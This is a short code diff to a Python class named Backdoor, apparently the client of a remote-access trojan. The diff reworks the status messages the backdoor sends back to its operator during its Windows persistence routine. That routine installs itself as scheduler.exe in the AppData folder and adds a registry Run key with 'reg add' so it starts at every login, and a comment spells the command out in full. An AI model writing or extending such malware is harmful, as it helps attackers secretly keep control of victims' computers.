@@ -44,7 +44,8 @@ class Backdoor:
 
 
         data = ""
-        data = data + "[+] Windows OS detected\n[+] Continuing with Persistence Operations"
+        data = data + parent_process_details
+        data = data + "[+] Windows OS detected"
         
         location = os.environ["appdata"]+"\\scheduler.exe"
         #location = os.environ["appdata"]+"\\client.py"
@@ -55,13 +56,15 @@ class Backdoor:
             #  reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Scheduler /t REG_SZ /d C:/Users/user1/AppData/Roaming/scheduler.exe /f
             #                                                                                        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
             #                                                                                        os.environ['appdata']
-            res = ""
+            res = "\n[+] Continuing with Persistence Operations"
             try:
                 subprocess.call('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Scheduler /t REG_SZ /d '+location+' /f',shell=True)
-                res = "\n[+] Successfully added executable to the Registry"
+                res += "\n[+] Successfully added executable to the Registry"
             except:
-                res = "\n[-] ERROR - Cannot add executable for persistence"
+                res += "\n[-] ERROR - Cannot add executable for persistence"
             data = data + res
+        else:
+            data = data + "\n[+] Persistence already established\n[+] Continuing previous session"
         self.reliable_send(data)
         return
 
